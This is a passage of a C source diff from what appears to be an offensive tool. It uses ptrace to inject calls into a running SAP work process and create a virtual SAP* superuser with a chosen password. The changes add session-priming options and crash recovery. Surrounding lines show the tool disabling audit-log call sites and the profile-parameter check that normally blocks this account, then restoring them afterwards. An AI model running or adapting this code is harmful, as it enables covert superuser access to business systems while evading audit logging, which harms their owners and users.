+     * zttaptr-based per-task struct (fields +0x130/+0x140/+0x100/+0x108/
+     * +0x150). +0x140 (dyGetUsrData) is the exact field
+     * LocFunc_FillEnqueStruct dereferences and crashes on when null — this
+     * is the actual writer, found via disassembly, not inferred from a
+     * neighboring-offset guess (unlike --set-session, which didn't fix it).
+     */
+    if (fill_areas) {
+        if (!off_global_areas) {
+            fprintf(stderr,
+                "[-] --fill-global-areas: dyGetGlobalAreas symbol not found\n"
+                "    on this binary (GCC isra-clone suffix may differ on this\n"
+                "    build). No hardcoded fallback for this new feature.\n"
+                "    Aborting.\n");
+            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+            ptrace(PTRACE_DETACH, pid, 0, 0);
+            return 1;
+        }
+        int areas_ok = 0;
+        call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
+                        base + off_global_areas,
+                        0, 0, 0, 0, singlestep, base, &areas_ok, 0, 0);
+        if (!areas_ok) {
+            fprintf(stderr,
+                "[-] --fill-global-areas: dyGetGlobalAreas call didn't return\n"
+                "    cleanly (see [debug] line above). Aborting rather than\n"
+                "    proceeding into create_virtual_* on a possibly-corrupted\n"
+                "    work process.\n");
+            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+            ptrace(PTRACE_DETACH, pid, 0, 0);
+            return 1;
+        }
+        if (!quiet) printf("[*] dyGetGlobalAreas() primed\n");
+    }
+
+    /* ── Optionally prime per-task session state (--set-session) ────────
+     * See DP_SESSION_INFO_NONE comment above: reproduces what ThStart's own
+     * dispatch loop does for this request type before invoking the handler,
+     * so create_virtual_sapstar's internal enqueue-lock helper
+     * (LocFunc_FillEnqueStruct) finds a populated per-task context instead of
+     * dereferencing a null field on an otherwise-idle worker.
+     */
+    if (set_session) {
+        if (!off_set_session) {
+            fprintf(stderr,
+                "[-] --set-session: ThWpSetCurrentSession symbol not found on\n"
+                "    this binary. Can't safely locate it without a hardcoded\n"
+                "    offset (none exists for this new feature). Aborting.\n");
+            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+            ptrace(PTRACE_DETACH, pid, 0, 0);
+            return 1;
+        }
+        int session_ok = 0;
+        call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
+                        base + off_set_session,
+                        (uintptr_t)DP_SESSION_INFO_NONE, 0, 0, 0,
+                        singlestep, base, &session_ok, 0, 0);
+        if (!session_ok) {
+            fprintf(stderr,
+                "[-] --set-session: ThWpSetCurrentSession call didn't return\n"
+                "    cleanly (see [debug] line above). Aborting rather than\n"
+                "    proceeding into create_virtual_* on a possibly-corrupted\n"
+                "    work process.\n");
+            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+            ptrace(PTRACE_DETACH, pid, 0, 0);
+            return 1;
+        }
+        if (!quiet) printf("[*] ThWpSetCurrentSession(no-session) primed\n");
+    }
+
+    /* ── Enqueue-crash recovery window (on by default, --no-patch-enque-crash
+     * to disable) ───────────────────────────────────────────────────────
+     * Self-contained: if LocFunc_FillEnqueStruct doesn't resolve on this
+     * binary, recovery just isn't available here — that's not an error,
+     * it's the same as the crash never happening. call_in_target only ever
+     * intervenes when it live-verifies both the address AND the exact
+     * instruction shape, so leaving this off has zero effect on builds/
+     * worker-states where the crash doesn't occur. */
+    uintptr_t recover_lo = 0, recover_hi = 0;
+    if (patch_enque && off_fillenque) {
+        recover_lo = base + off_fillenque;
+        recover_hi = recover_lo + FILLENQUE_WINDOW;
     }
 
     /* ── Call the function ────────────────────────────────────────────── */
@@ -848,7 +1246,8 @@ int main(int argc, char *argv[]) {
         rc = call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                             fn_target,
                             client_ptr, (uintptr_t)purpose, validity,
-                            (long)pw_ptr, singlestep, base);
+                            (long)pw_ptr, singlestep, base, NULL,
+                            recover_lo, recover_hi);
     } else {
         /*
          * create_virtual_sapstar(client*, pw_buf*, int32_t validity)
@@ -856,7 +1255,8 @@ int main(int argc, char *argv[]) {
          */
         rc = call_in_target(pid, &saved, (uintptr_t)scratch, trap_site,
                             fn_target,
-                            client_ptr, pw_ptr, validity, 0, singlestep, base);
+                            client_ptr, pw_ptr, validity, 0, singlestep, base, NULL,
+                            recover_lo, recover_hi);
     }
 
     /* ── Restore audit log call sites immediately after call ────────────── */
@@ -867,7 +1267,7 @@ int main(int argc, char *argv[]) {
     }
 
     /* ── Restore profile-param check immediately after call ─────────────── */
-    if (no_profile_check) {
+    if (no_profile_check && profile_site) {
         poke_text_n(pid, profile_site, &profile_orig, 1);
         if (!quiet) printf("[*] login/create_virtual_user_sapstar check restored\n");
     }
